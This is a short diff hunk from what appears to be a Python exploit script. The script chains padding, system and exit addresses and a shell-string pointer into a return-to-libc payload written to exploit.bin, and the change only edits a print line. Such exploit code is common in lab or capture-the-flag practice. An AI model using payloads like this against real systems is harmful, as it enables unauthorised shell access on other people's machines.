@@ -18,7 +18,7 @@ prshell = (p64(rshell))
 
 exploit = (junk + psystem + pexit + prshell)
 
-print ("1\n")
+print ("1")
 print (exploit) 
 
 f = open("exploit.bin", "wb")
